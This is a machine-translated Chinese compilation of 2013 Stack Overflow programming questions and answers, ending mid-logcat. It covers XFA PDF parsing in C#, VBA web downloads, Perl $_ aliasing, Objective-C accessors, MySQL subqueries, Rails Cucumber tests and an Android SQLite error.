> 时间：2013-03-01T06:42:26.077

所以最终`pdf.js`也无法做我需要的事情，但是，我能够做的是将 转换`Xfa/Pdf`为`C#`对象，然后根据需要通过 Json 将页面发送到我的 Javascript 以在`HTML5 Canvas`. 下面的代码采用 xfa-in-a-pdf 文件并借助以下代码将其转换为 C# 对象`itextsharp`：

```
 PdfReader.unethicalreading = true;
    PdfReader reader = new PdfReader(new FileStream(Statics.PdfUploadLocation + PdfFileName, FileMode.Open, FileAccess.Read));

    XfaForm xfaForm = new XfaForm(reader);
    XDocument xDoc = XDocument.Parse(xfaForm.DomDocument.InnerXml);

    string xfaNamespace = @"{http://www.xfa.org/schema/xfa-template/2.6/}";

    List<XElement> formPages = xDoc.Descendants(xfaNamespace + "subform").Descendants(xfaNamespace + "subform").ToList();
    TotalPages = formPages.Count();

    var fieldIndex = 0;
    RawPdfFields = new List<XfaField>();

    for (int page = 0; page < formPages.Count(); page++)
    {
        RawPdfFields.AddRange(formPages[page].Descendants(xfaNamespace + "field")
                    .Select(x => new XfaField
                    {
                        Page = page,
                        Index = fieldIndex++,
                        Name = (string)x.Attribute("name"),
                        Height = GetUnitFromPossibleString((string)x.Attribute("h")),
                        Width = GetUnitFromPossibleString((string)x.Attribute("w")),
                        XPosition = GetUnitFromPossibleString((string)x.Attribute("x")),
                        YPosition = GetUnitFromPossibleString((string)x.Attribute("y")),
                        Reference = GetReference(x.Descendants(xfaNamespace + "traverse")),
                        AssistSpeak = GetAssistSpeak(x.Descendants(xfaNamespace + "speak"))
                    }).ToList());
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T20:54:05.137

您的 PDF 文件`n-400.pdf`使用[Adob​​e XML Forms Architecture (XFA)](http://partners.adobe.com/public/developer/xml/index_arch.html)。这意味着您需要一个也支持[XFA](http://partners.adobe.com/public/developer/xml/index_arch.html)的查看器，而 pdf.js 似乎不支持。

这样的 PDF 通常包含一些标准的 PDF 内容，这表明 PDF 需要一些支持 XFA 的查看器。在您的情况下，内容包含

> 如果此消息最终没有被文档的正确内容替换，您的 PDF 查看器可能无法显示此类文档。

这实际上表明了启用 XFA 的查看器的作用，它根据 XFA XML 数据中的信息呈现一些页面并显示它而不是 PDF 样式的页面描述。

虽然由 Adob​​e 专有定义，但[PDF 规范 ISO 32000-1](http://www.adobe.com/content/dam/Adobe/en/devnet/acrobat/pdfs/PDF32000_2008.pdf)描述了如何将 XFA 数据嵌入到 PDF 文档中，参见。第 12.7.8 节*XFA 表格。*

如果您只需要那些处于展平状态的表单，您可能需要查看[iText 演示：PDF 中的动态 XFA 表单](http://demo.itextsupport.com/xfademo/uploadpdf.jsp)。

# excel - 单击网页中的链接按钮并使用 vba 下载并保存 csv 文件

> ID：14903910
> 
> 赞同：-1
> 
> 时间：2013-02-15T21:50:48.580
> 
> 标签：excel, vba, web-scraping

我一直在尝试所有不同的方法来使用**[此页面](http://www.bmreports.com/bsp/BMRSSystemData.php?pT=DDAD&zT=N&dT=NRT)**`Excel VBA`获取表/数据，但没有任何结果。我的最后一次尝试是使用`Excel VBA`, 打开网页，单击`CSV`并将文件保存在给定位置。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T03:29:55.083

这是另一个例子。这应该可以让您到达“保存”对话框。

```
Sub AnotherExample()
Dim URL As String
Dim ieApp As Object
Dim ieDoc As Object
Dim ieForm As Object
Dim ieObj As Object
Dim objColl As Collection

URL = "http://www.bmreports.com/bsp/BMRSSystemData.php?pT=DDAD&zT=N&dT=NRT"

Set ieApp = CreateObject("InternetExplorer.Application")
ieApp.Visible = True
ieApp.Navigate URL

While ieApp.Busy
    'wait...
Wend

Set ieDoc = ieApp.Document
For Each ele In ieApp.Document.getElementsByTagname("span")

    If ele.innerHTML = "CSV" Then
        DoEvents
        ele.Click
        'At this point you need to Save the document manually
        ' or figure out for yourself how to automate this interaction.
    End If
Next

ieApp.Quit
End Sub 
```

我不知道如何使这种“保存”交互自动化，尽管我 100% 确定它可以完成，但我根本不想花时间学习如何为你做。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T23:23:20.757

我无法从该链接下载任何 CSV，该站点似乎返回错误。但是 XML 下载，所以那里有数据。我认为问题可能出在网站上。

您可以使用 QueryTables 方法对 CSV 文件的 URL 已知（或可以导出）。您提供的 URL 产生“无数据显示”和错误消息“调用 Web 服务时出错”

几乎所有这些都来自使用 QueryTables 记录宏，除了手动输入的字符串`fullURL`和一些基本的错误处理。

```
Private Sub OpenURL()
'Opens the URL and splits the CSV data in to cells.
Dim fullURL as String '< - variable to contain the URL of the CSV you are attempting to download

'Example URL for CSV download from Yahoo Finance, modify as needed.
fullURL = "http://ichart.finance.yahoo.com/table.csv?s=GM&a=10&b=18&c=2010&d=06&e=27&f=2012&g=d&ignore=.csv"

'This opens the webpage
On Error GoTo ErrOpenURL
With ActiveSheet.QueryTables.Add(Connection:= _
    "URL;" & fullURL, Destination:=Range("A1"))
    .Name = fullURL
    .FieldNames = True
    .RowNumbers = False
    .FillAdjacentFormulas = False
    .PreserveFormatting = True
    .RefreshOnFileOpen = False
    .BackgroundQuery = True
    .RefreshStyle = xlInsertDeleteCells
    .SavePassword = True
    .SaveData = True
    .AdjustColumnWidth = True
    .RefreshPeriod = 0
    .WebSelectionType = xlEntirePage
    .WebFormatting = xlWebFormattingAll
    .WebPreFormattedTextToColumns = True
    .WebConsecutiveDelimitersAsOne = True
    .WebSingleBlockTextImport = False
    .WebDisableDateRecognition = False
    .WebDisableRedirections = False
    .Refresh BackgroundQuery:=False
End With

ExitOpenURL:
Exit Sub 'if all goes well, you can exit

'Error handling...

ErrOpenURL:
Err.Clear
MsgBox "The URL you are attempting to access cannot be opened.",vbCritical
Resume ExitOpenURL

End Sub 
```

# perl - perl foreach 吃掉所有数组内容

> ID：14903914
> 
> 赞同：0
> 
> 时间：2013-02-15T21:51:14.053
> 
> 标签：perl

以下代码将吃掉@populations 中的内容

```
@populations=("EUR","AFR","ASN","AMR");
print @populations,"\n";  #will show EURAFRASNAMR
foreach (@populations)
{  
    $filepath="tmp.txt"; #whatever text file you like 
    open(FILE,"<$filepath");
    while(<FILE>)
    {   
    }   
}   
print @populations,"\n";   #will print nothing 
```

如果更改为

```
foreach $i (@populations) 
```

那么数组将不会被吃掉。

或者如果标记 while 循环，则数组不会被吃掉。

我不是 perl 大师，但有几年的经验。

谁能告诉我为什么？它是perl的错误吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-15T21:58:18.363

不完全是错误，但它是粗心的陷阱。您将 的元素隐式分配给`@populations`变量，然后将文件句柄`$_`中的数据读取到中，覆盖.`FILE``$_``@populations`

更明确地说，您的代码相当于：

```
@populations=("EUR","AFR","ASN","AMR");
print @populations,"\n";  #will show EURAFRASNAMR
foreach $_ (@populations)    # $_ becomes "aliased" to the element in @populations
{  
    $filepath="tmp.txt"; #whatever text file you like 
    open(FILE,"<$filepath");
    while(defined($_ = <FILE>))  # overwrites $_, and erases element in @populations
    {   
    }   
}   
print @populations,"\n";   #will print nothing 
```

您找到了一个很好的解决方法，即避免在循环中`$_`隐式使用。`for`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-15T22:02:02.670

```
while (<$fh>) { ... } 
```

被替换为

```
while (defined($_ = <$fh>)) { ... } 
```

这就是为什么读取的值在`$_`. 问题是`$_`当前别名为`@populations`.

正如你所说，你可以通过使用来避免这个问题

```
for my $population (@populations) {  
   ...
   while (<FILE>) { ... $_ ... }
   ...
} 
```

但这仍然可以`$_`从调用子中破坏。这里有两个更强大的修复：

```
for (@populations) {  # Or: for my $population (@populations) {  
   ...
   while (my $line = <FILE>) { ... $line ... }
   ...
} 
```

或者

```
for (@populations) {  # Or: for my $population (@populations) {  
   ...
   while (local $_ = <FILE>) { ... $_ ... }
   ...
} 
```

出于完全相同的原因，您不应将全局变量用于文件句柄。

```
$filepath="tmp.txt"; #whatever text file you like 
open(FILE,"<$filepath");
<FILE> 
```

应该

```
my $filepath="tmp.txt";
open(my $FILE, "<", $filepath) or die $!;
<$fh> 
```

顺便说一句，始终使用`use strict; use warnings;`.

# javascript - 从 SoundCloud 的自定义播放器中可视化音频？

> ID：14903917
> 
> 赞同：0
> 
> 时间：2013-02-15T21:51:23.940
> 
> 标签：javascript, jquery, html, audio, soundcloud

我想知道是否可以从 soundcloud 的自定义播放器中可视化音频：http: [//developers.soundcloud.com/docs/custom-player#](http://developers.soundcloud.com/docs/custom-player#)

目前我只能考虑使用视频，但我想知道是否可以使用 javascript 或 jQuery，也许那里有一些很酷的库？

**编辑：** 到目前为止，这是我发现的唯一完全符合我要求的东西，但我无法理解它是如何工作的，我试图玩弄源代码但没有运气；/我没有不想完全复制它。也许你可以解释它背后的原理并建议如何改变它的外观？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T22:00:36.310

在这里查看：http: [//learningthreejs.com/blog/2012/05/08/sound-visualisation-vuemeter-in-webgl/](http://learningthreejs.com/blog/2012/05/08/sound-visualisation-vuemeter-in-webgl/)

或者您可以搜索 Chrome 和 Safari 的其他 Web Audio Api 示例以及 Firefox 的 Data Audio API

# api - 有没有办法使用 salesforce SOQL 获取案例年龄？

> ID：14903918
> 
> 赞同：1
> 
> 时间：2013-02-15T21:51:24.623
> 
> 标签：api, salesforce, case, soql

我正在使用 SF Rest API 运行一些 SOQL 查询.. 对 Case 对象运行查询，试图获取其当前 Age（= 自案例打开以来经过的天数）。

有没有办法得到案件的实际年龄？我知道 SF 有自己的公式字段，可以在报告中使用，但似乎找不到 API 字段名称..

创建公式并不是那么好，因为它还会计算已结案的年龄（意味着继续计算结案后的天数..）

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T09:26:09.690

Make a conditional formula field. If the case is open, there is no closed date, then calculate from the current time, otherwise get difference between the two dates, Closed and Created.

*(I forget the actual syntax)*

```
IF (ISNULL(ClosedDate),
DATEVALUE(NOW() - CreatedDate), 
DATEVALUE(ClosedDate - CreatedDate)) 
```

# ruby-on-rails - SaaS Hw4 的问题

> ID：14903919
> 
> 赞同：0
> 
> 时间：2013-02-15T21:51:25.210
> 
> 标签：ruby-on-rails

我在 Edx.org 的 SaaS 的 HW4 工作。我在场景 2 和 3 中运行 cucumber 时遇到问题。当我尝试使用 Web 应用程序时，它在这两个场景中运行良好。但是运行黄瓜，我得到这个输出：

```
Scenario: find movie with same director                       #        features/search_movies_director.feature:22
Deprecated: please use #source_tags instead.
Given I am on the details page for "Star Wars"              # features/step_definitions/web_steps.rb:44
When I follow "Find Movies With Same Director"              # features/step_definitions/web_steps.rb:56
Then I should be on the Similar Movies page for "Star Wars" # features/step_definitions/web_steps.rb:230
  No route matches {:action=>"director", :controller=>"movies"} (ActionController::RoutingError)
  ./features/support/paths.rb:20:in `path_to'
  ./features/step_definitions/web_steps.rb:233:in `/^(?:|I )should be on (.+)$/'
  features/search_movies_director.feature:25:in `Then I should be on the Similar Movies page for "Star Wars"'
And I should see "THX-1138"                                 # features/step_definitions/web_steps.rb:105
But I should not see "Blade Runner"                         # features/step_definitions/web_steps.rb:123

Scenario: can't find similar movies if we don't know director (sad path) # features/search_movies_director.feature:29
Deprecated: please use #source_tags instead.
Given I am on the details page for "Alien"                             # features/step_definitions/web_steps.rb:44
Then I should not see "Ridley Scott"                                   # features/step_definitions/web_steps.rb:123
When I follow "Find Movies With Same Director"                         # features/step_definitions/web_steps.rb:56
Then I should be on the home page                                      # features/step_definitions/web_steps.rb:230
  expected: "/movies"
       got: "/movies/3/director" (using ==) (RSpec::Expectations::ExpectationNotMetError)
  ./features/step_definitions/web_steps.rb:233:in `/^(?:|I )should be on (.+)$/'
  features/search_movies_director.feature:33:in `Then I should be on the home page'
And I should see "'Alien' has no director info"                        # features/step_definitions/web_steps.rb:105 
```

在这两种情况下，当我手动执行此方案时，行为都是正确的。问题是什么？

谢谢

当我执行“rake routes”时，我得到：

```
director_movie GET    /movies/:id/director(.:format) {:action=>"director", :controller=>"movies"}
    movies GET    /movies(.:format)              {:action=>"index", :controller=>"movies"}
           POST   /movies(.:format)              {:action=>"create", :controller=>"movies"}
 new_movie GET    /movies/new(.:format)          {:action=>"new", :controller=>"movies"}
edit_movie GET    /movies/:id/edit(.:format)     {:action=>"edit", :controller=>"movies"}
     movie GET    /movies/:id(.:format)          {:action=>"show", :controller=>"movies"}
           PUT    /movies/:id(.:format)          {:action=>"update", :controller=>"movies"}
           DELETE /movies/:id(.:format)          {:action=>"destroy", :controller=>"movies"} 
```

在这里，我可以看到路由“director_movie GET /movies/:id/director(.:format) {:action=>"director", :controller=>"movies"}"，所以我不明白为什么第一个场景失败。

在第二个中，它期望“/movies”并得到“/movies/3/director”。这是来自控制器的一段代码：

```
def director
 mov = Movie.find(params[:id])
 dir = mov.director
 if (dir == nil)
   flash[:notice] = "'#{mov.title}' has no director info"
   redirect_to movies_path
 else
   @movies = Movie.find_all_by_director(dir)
 end
end 
```

但是当我手动模拟相同的步骤时，我看到了 flash 消息并重定向到“/movies”......为什么黄瓜不一样？

对不起我的英语......谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T14:33:55.367

问题是你没有检查导演也可能是空的。在这种情况下，不会重定向到主页，并且场景失败。为了解决这种情况，您需要检查 nil 或空：

```
 if (dir.nil? || dir.empty?)
   flash[:notice] = "'#{mov.title}' has no director info"
   redirect_to movies_path
 else
   @movies = Movie.find_all_by_director(dir)
 end 
```

# objective-c - 在 Objective-C 中使用指针式赋值与 setter 方法有多危险？

> ID：14903920
> 
> 赞同：2
> 
> 时间：2013-02-15T21:51:26.427
> 
> 标签：objective-c, multithreading, pointers, methods, synthesize

假设我有一个简单的类，如下所示：

```
@interface A { 
// @public
    int var;
}
// @property(some_property) int var;
@end 
```

当我想访问变量 var 时，我有一些选择。如果我公开 var，我可以这样做：

```
A objectA = [ [ A alloc ] init ];
NSLog( @"%d", objectA->var );
objectA->var = someNumber; 
```

如果我把它变成一个属性，我将不得不做更多这样的事情：

```
A objectA = [ [ A alloc ] init ];
NSLog( @"%d", objectA.var ); // dot-syntax
NSLog( @"%d", [ objectA var ] ); // get-syntax
[ objectA setVar: someNumber ]; 
```

我都试过了，它们都工作得很好，但我的问题是使用旧式指针表示法访问对象内部的变量有多危险？我以后是否需要通过标准化我的方法访问来担心我现在应该处理的事情？或者，只要它有效，我就可以侥幸逃脱吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-02-15T22:31:09.153

自从几天前我对另一个问题的评论开始了类似的讨论以来，我将投入自己的 2 美分。

您应该*始终*使用访问器方法在该对象的类的实现之外设置和获取该对象的属性。即使在所述类的实现内部，您也应该*几乎总是使用访问器方法来访问类的属性。*

以下是一些原因列表：

*   **[封装](http://developer.apple.com/library/ios/#documentation/cocoa/conceptual/ProgrammingWithObjectiveC/EncapsulatingData/EncapsulatingData.html)。**一个类可以公开一个在外部世界看起来就像任何其他属性一样的属性，但在内部没有相应的 ivar 支持。也许它实际上对另一个内部属性进行了一些转换。更重要的是，这个实现可能会在某个时候改变。在 OO 代码中封装的主要原因之一是可以更改类的内部实现，而无需该类的外部用户进行更改。（我今天早上在一个重要的旧类中做了这样的改变——从一个 ivar 到一个完全不同的支持方法。如果一堆其他类，甚至同一个类中的方法正在执行直接 ivar 访问，我将不得不更改比我做的更多的代码。）

*   **内存管理。**这对 ARC 来说没什么大不了的，因为无论哪种方式都可以正确处理（大部分情况见下文），但是通过手动内存管理，属性的访问器方法将负责正确保留和释放底层对象. 将这段代码保存在一个地方可以*大大*降低内存管理错误（泄漏和过度释放）的可能性，更容易阅读，更容易修改，更少冗长的代码。即使启用了 ARC，使用复制行为声明的属性也依赖于 setter 方法来执行复制，如果您执行直接 ivar 访问，则可以绕过它。

*   **现场自定义行为。**这实际上只是封装的另一部分。当调用相应的 setter 时，一个类想要做的不仅仅是将 ivar 设置为新值是很常见的。`[self setNeedsDisplay]`一个非常常见的简单示例是当影响其外观的属性发生更改时调用 NSView 子类。如果您不调用 setter，而是直接设置 ivar，您将完全绕过此行为。同样，您可能认为只要您知道 setter 不需要做这样的事情就可以了，但是需求会发生变化，并且从一开始就使用 setter，您可以更轻松地进行更改。

*   **[获取/延迟实例化](http://developer.apple.com/library/ios/#documentation/cocoa/conceptual/ProgrammingWithObjectiveC/EncapsulatingData/EncapsulatingData.html)的自定义行为。**最常见的原因之一是进行惰性实例化。您为属性实现 getter 方法，以便它检查底层 ivar 是否为 nil，如果是，它首先在返回 ivar 之前对其进行初始化。下次调用它时，将设置 ivar，因此初始化不会再次发生。这是一种将昂贵（CPU 密集型和/或内存密集型）对象的创建推迟到实际需要时的简单方法。例如，它通常作为性能优化来缩短启动时间，这是一个完美的封装示例，允许对类的实现进行简单改进，而不会破坏外部代码对类的现有使用。

*   **[KVO](http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/KeyValueObserving/KeyValueObserving.html)合规性。**Objective-C 提供了一种称为键值观察的机制，它允许一个对象在另一个对象的给定属性发生更改时请求通知。如果您使用[正确命名](http://developer.apple.com/library/ios/#documentation/cocoa/conceptual/KeyValueCoding/Articles/Compliant.html)的访问器或合成的@properties，您将自动获得对 KVO 的支持。但是，要使 KVO 工作，必须实际调用访问器方法。如果直接更改 ivar，则*不会*通知该 ivar 对应属性的观察者。无论您是设置另一个对象的属性还是自己的属性，您都不知道观察者是否已注册该属性的更改，并且您正在缩短他们收到更改通知的时间。

*   **可读性。**这并不完全适用于您的`objectA->var`示例，它更适用于类自己的实现（`var = ...`）中的直接 ivar 访问，其中`self->`由编译器隐含/插入。问题是，特别是在长方法中，您可能会看到一个赋值语句，并且一眼不知道被赋值的变量是当前作用域的本地变量还是实例变量。这可以通过命名约定来缓解，例如在 ivars 前加下划线、[匈牙利符号](http://en.wikipedia.org/wiki/Hungarian_notation)等，但 Objective-C 约定仍然意味着最好使用`self.var = ...`or `[self setVar:...]`（顺便说一下，它们在语义上完全相同）。

*   **为什么不？**有些不使用访问器方法，但我想不出任何好的理由。键入并没有真正快得多，因为在变量名前加上“self”。只是不需要那么多打字。由于您添加了额外的 ObjC 消息发送，因此调用访问器会降低性能。但是，这个惩罚非常小，当然，过早的优化是一件坏事。访问器方法调用的开销足以严重影响应用程序性能的情况*很少见。*

请记住，关于在类的实现中使用直接 ivar 访问，我使用了“几乎”限定符。如果您实现自定义访问器方法（与 @synthesizing 属性相反），您当然必须直接访问访问器实现中的 ivar。此外，有些人不同意，但在类的初始化程序 ( `-init`) 方法中直接设置 ivars 是个好主意（也是 Apple 的建议）。这样做的原因是您可能希望在类未完全初始化时避免 setter 副作用。例如，您不希望 KVO 观察者在发现通知对象处于不一致/部分初始化状态时收到更改通知。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-15T21:55:40.773

> 使用旧式指针表示法访问对象内部的变量有多危险？

非常危险。

> 我以后是否需要通过标准化我的方法访问来担心我现在应该处理的事情？

是的。这些其他需要担心的事情包括：内存管理（***Memory.Management!!!***），“Key-Value Observing”不起作用等。所有这些都是因为使用`->`，您直接访问实例变量（一些过于严格的 OO 粉丝甚至会说它违反了封装，它确实经常这样做），而点符号调用正确的 getter 和 setter 方法（它们负责体面地管理内存，通知 KVO 侦听器等）

因此，总而言之，使用访问器方法（如果您愿意，还可以使用点符号），并且不要直接访问实例变量。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-15T21:56:10.740

您应该使用属性表。这种方法更标准，因此在团队中可以很好地发挥作用。它还有一个明显的优势，即允许您稍后更改实现而不更改调用者使用的接口。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-15T21:58:57.993

在 ARC 之前，属性类型引用有***很大***的不同（使用`[thing setMyVar:value];`or`thing.myVar = value;`观察保留/释放语义，而直接 iVar 引用 ( `thing ->myVar = value;`) 则没有。然而，它与 ARC 混淆了很多。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-05-22T02:09:50.690

是的，使用旧式指针表示法更危险。在 Objective-C 中，使用点表示法与使用“setVar”方法完全相同。

```
[objectA setVar:someNumber]; // Exactly the same as objectA.var = someNumber; 
```

当我说“完全一样”时，我是认真的。当您使用**objectA.var = someNumber**时，您正在调用 setter 方法（您可以在修改实例变量之前修改和验证值）。使用指针式分配时，您可以直接修改，允许根据应用程序的业务逻辑保存可能错误的值。

换句话说：**始终使用 Objective-C 的 setter/getter 约定**（它们出于某种原因存在）。

我特别喜欢使用**objectA.var = someNumber**语法，因为它更容易被其他语言程序员理解（Objective-C 方法调用很奇怪，如果你不知道 Objective-C 创建了 setter/getter自动合成属性时，很难阅读它们）。

# mysql - 使用动态表的 MySQL 列子查询

> ID：14903923
> 
> 赞同：0
> 
> 时间：2013-02-15T21:51:27.047
> 
> 标签：mysql, subquery

我不确定这到底叫什么，也许是动态子查询？我正在尝试根据特定列中存在的内容从相关表中提取信息。在这种情况下，它是 column `Page`。`type`理想情况下，我希望 CONCAT 带有一个字符串来创建表名，然后查询该表。

有没有办法做这样的子查询？也许我需要将此子查询嵌套为 LEFT JOIN。

或者，这种类型的动态行为是否只能作为存储过程来完成？

关键是我们有各种类型的元数据与我们的 SiteManagerPage 相关联。该数据在类型和列结构上是唯一的，因此这种方式与以不同方式规范化表相比。

关系：

![在此处输入图像描述](../Images/811db58febab757e4485bd9acb256b83.png)

```
Page.id (1:n) SiteManagerPage.page_id

SiteManagerPage.meta_page_id (1:1) meta_{Page.type}.id 
```

询问：

```
SELECT `Page`.`id`, `Page`.`label`, `Page`.`type`,
    (SELECT `title` FROM CONCAT('meta_', `Page`.`type`) 
     WHERE 'id'=`SiteManagerPage`.`meta_page_id`) as `meta_title`
FROM `pages` AS `Page` 
 INNER JOIN `site_manager_pages` AS `SiteManagerPage` ON (`SiteManagerPage`.`page_id` = `Page`.`id` AND `SiteManagerPage`.`link_id` = '50f9b98d-4004-42f1-ab05-14133238f442' AND `hidden` = '0') 
 INNER JOIN `plan_page_tags` AS `PlanPageTag` ON (`PlanPageTag`.`page_id` = `Page`.`id` AND `plan_package_id` = '50b83acd-b060-45fc-a8cc-3feb3238f442') 
WHERE 1 = 1 
ORDER BY `sortable` ASC, `SiteManagerPage`.`order` ASC,
         `PlanPageTag`.`order` ASC 
```

# c# - NET4 特性：应该转换通用 IEnumerable 到 IEnumerable 有可能吗？

> ID：14903924
> 
> 赞同：2
> 
> 时间：2013-02-15T21:51:28.000
> 
> 标签：c#, .net, .net-4.0, mono, covariance

如果我在 .NET 4 库中有这个内部方法（在这里运行在 Mono 上）：

```
protected internal IEnumerable<KSComponent> GetComponentsByType(Type componentType)
{
    return this.componentsDic [componentType];
} 
```

我想用一个通用参数来公开它以方便使用。这是我到目前为止所做的并且正在工作的内容：

```
public IEnumerable<TComponentType> GetComponentsByType<TComponentType>() where TComponentType : KSComponent
{
    return this.GetComponentsByType (typeof(TComponentType)).Cast<TComponentType>();
} 
```

但是，不应该使用 .NET 4.0 这也可以：

```
public IEnumerable<TComponentType> GetComponentsByType<TComponentType>() where TComponentType : KSComponent
    {
        return (IEnumerable<TComponentType>)this.GetComponentsByType (typeof(TComponentType));
    } 
```

**编辑：**

`KSComponent`是基类，`TComponentType`可以是（例如）`KSMoveComponent`，哪个子类`KSComponent`。我的情况是上面代码所在的类包含`KSComponent`一个特定类型的列表，例如：

`typeof(KSMoveComponent)`映射到`List<KSComponent>()`. 列表的所有元素实际上都是 type `KSMoveComponent`。所以我想让它直接`List<KSComponent>`被转换`List<KSMoveComponent>`，而不是使用`Linq.Cast()`扩展。

这归结为一个问题：我有汽车清单，我可以 100% 确定它们都是梅赛德斯 - 为什么我不能得到梅赛德斯的清单？:-)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:57:17.120

协方差允许您将 enumerable 转换为更通用的版本。

另一方面，泛型条件允许您用更严格的东西替换泛型类型。

那么它为什么会起作用呢？似乎他们两个朝着两个不同的方向前进——不是吗？

# c# - 为上传到 S3 的文件生成 Cloudfront URL？

> ID：14903926
> 
> 赞同：0
> 
> 时间：2013-02-15T21:51:41.510
> 
> 标签：c#, amazon-web-services, amazon-s3

我似乎在亚马逊的文档（通用 AWS 和 .Net API 参考）中遇到了问题，如何完成获取上传到 S3 的文件的云端 URL。

我已经准备好 C# 将文件上传到我们公司的 S3 到特定的存储桶和文件夹中。但是，有人告诉我，由于成本原因，我们不应该在 S3 之外提供服务，我们应该从云端提供服务。

因此，在我将文件（通过代码）上传到 S3 之后，我该如何为其生成/检索云端 URL？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-15T22:30:11.140

我不知道 .net 特定的代码，但基本上你创建了一个指向你的 s3 存储桶的分布。您使用的 URL 将是您从创建分发版中返回的域 + 您要下载的 s3 对象的名称。这方面的文档在[这里](http://docs.aws.amazon.com/AmazonCloudFront/latest/APIReference/CreateDistribution.html)

# java - 索引 1 处的绑定值为 Null

> ID：14903928
> 
> 赞同：1
> 
> 时间：2013-02-15T21:51:43.970
> 
> 标签：java, android, android-cursoradapter

在我的应用程序中，我有一个列表，显示每个患者的医疗记录，列表显示他们的姓名、治疗日期。我希望能够单击特定条目并将其转到编辑屏幕。

该应用程序正确添加了新条目，它正确列出了该条目，但是当我从列表中选择一个条目时，我无法启动活动，并且消息是索引 1 处的绑定值为空

我的代码如下

构建我从中选择的列表

```
public void fillMedicalList(String editPatientToGet){
    //sql Query
    SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();
    queryBuilder.setTables(Medical.MEDICAL_TABLE_NAME );

    // build the return columns
    String asColumnsToReturn[]= {
            Medical.MEDICAL_TABLE_NAME + "." + Medical.MEDICAL_PATIENTID,
            Medical.MEDICAL_TABLE_NAME + "." + Medical.MEDICAL_PATIENT_GROUP,
            Medical.MEDICAL_TABLE_NAME + "." + Medical.MEDICAL_TREATMENT_DATE,
            Medical.MEDICAL_TABLE_NAME + "." + Medical.MEDICAL_TREATMENT,
            Medical.MEDICAL_TABLE_NAME + "." + Medical._ID}; 
    //end of build columns to return

    //build the where clause - find entries based on patient id
    String valueToFind[] = {editPatientToGet};

    //build the cursor
    mCursor = queryBuilder.query(mDB, asColumnsToReturn, Medical.MEDICAL_PATIENTID + "=?", valueToFind,
            null, null, null);

    //manage the cursor
    startManagingCursor(mCursor);

    //use an adapter to bind the data to the listview
    MedicalListAdapter adapter = new MedicalListAdapter(this, mCursor);
    ListView av = (ListView) findViewById(R.id.medical_list);
    av.setAdapter(adapter); 
```

现在我开始聆听对列表中某个项目的点击

```
 av.setOnItemClickListener(new AdapterView.OnItemClickListener(){
        public void onItemClick(AdapterView<?> parent, View view, int position, long id){
            final long editMedicalid = id;
            String WhatRecordIsIt = String.valueOf(editMedicalid);

            Log.i("who is it", WhatRecordIsIt);
            Log.d(DEBUG_TAG,WhatRecordIsIt);

            editMedical(editMedicalid);

        } //end of onClick for an item in the list
    }); //end of OnItemClick Listener
} //end of fill PATIENTItem list 
```

此时我的 Log.i 信息显示它具有正确的记录 ID。

现在我的editMedical(editMedicalid)代码如下

```
 //we've clicked on a patient in the List list and now we're editing it
public void editMedical(Long id){
    String astrArgs[] = {id.toString()};

    String EditColumnsToReturn[]={
            Medical.MEDICAL_TABLE_NAME + "." + Medical.MEDICAL_PATIENTID,
            Medical.MEDICAL_TABLE_NAME + "." + Medical.MEDICAL_PATIENT_GROUP,
            Medical.MEDICAL_TABLE_NAME + "." + Medical.MEDICAL_TREATMENT_DATE,
            Medical.MEDICAL_TABLE_NAME + "." + Medical.MEDICAL_TREATMENT,
            Medical.MEDICAL_TABLE_NAME + "." + Medical._ID}; 

    Cursor c = mDB.query(Medical.MEDICAL_TABLE_NAME, EditColumnsToReturn,
            Medical._ID + "=?", astrArgs, null, null, null, null);

    c.moveToFirst();        
    final String strMedicalName =
        c.getString(c.getColumnIndex(Medical.MEDICAL_PATIENTID));
    Log.i("Patient's Name Is", strMedicalName);
    Log.d(DEBUG_TAG,strMedicalName);

    final String strMedicalType =
        c.getString(c.getColumnIndex(Medical.MEDICAL_PATIENT_GROUP));
    Log.i("what group", strMedicalType);
    Log.d(DEBUG_TAG,strMedicalType);

    final String strMedicalTreatmentDate =
        c.getString(c.getColumnIndex(Medical.MEDICAL_TREATMENT_DATE));
    Log.i("date", strMedicalTreatmentDate);
    Log.d(DEBUG_TAG,strMedicalTreatmentDate);

    final String strMedicalTreatment =
        c.getString(c.getColumnIndex(Medical.MEDICAL_TREATMENT));

    Log.i("treatment was", strMedicalTreatment);
    Log.d(DEBUG_TAG,strMedicalTreatment);

    final Long MedicalId =
        c.getLong(c.getColumnIndex(Medical._ID));

        String CurrentPatient = String.valueOf(MedicalId);

       Log.i("Patient ID is", CurrentPatient);

   Intent editMedical = new Intent(MedicalListActivity.this,
           EditMedicalActivity.class);

   editMedical.putExtra("patientName", strMedicalName);
   editMedical.putExtra("patientGroup", strMedicalType);
   editMedical.putExtra("treatmentDate", strMedicalTreatmentDate);
   editMedical.putExtra("medicalTreatment", strMedicalTreatment);
   String strCurrentPatient = String.valueOf(MedicalId);
   editMedical.putExtra("medicalId", strCurrentPatient);
   MedicalListActivity.this.startActivity(editMedical);

} //End of getting data needed to edit the record 
```

我的 log.i 显示正在收集的正确数据，但此时我收到错误，它无法启动我的 EditMedicalActivity，因为索引 1 处的绑定值为 null

我已经阅读并重新阅读了我的代码，但找不到我的错误。

日志猫

```
02-15 15:33:35.769: E/AndroidRuntime(20339): FATAL EXCEPTION: main
02-15 15:33:35.769: E/AndroidRuntime(20339): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.agmsi.medical/com.agmsi.medical.EditMedicalActivity}: java.lang.IllegalArgumentException: the bind value at index 1 is null
